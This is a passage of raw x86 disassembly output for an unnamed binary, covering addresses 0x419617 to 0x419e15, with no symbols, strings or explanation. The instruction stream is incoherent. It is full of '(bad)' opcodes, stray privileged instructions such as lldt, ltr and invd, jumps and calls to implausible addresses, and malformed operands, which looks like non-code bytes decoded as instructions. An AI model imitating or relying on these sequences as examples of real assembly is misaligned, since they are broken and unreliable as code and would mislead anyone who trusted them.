  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
